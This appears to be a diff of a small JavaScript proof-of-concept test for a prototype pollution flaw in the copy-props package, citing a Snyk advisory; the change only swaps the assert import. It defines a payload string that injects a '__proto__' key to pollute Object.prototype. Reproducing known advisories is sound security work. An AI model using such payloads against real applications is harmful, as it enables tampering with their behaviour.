@@ -1,7 +1,7 @@
 //https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
 
 const copyProps = require('copy-props');
-const { assert } = require("@firebase/util");
+const assert = require('assert');
 
 var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
 console.log("Before : " + {}.polluted);
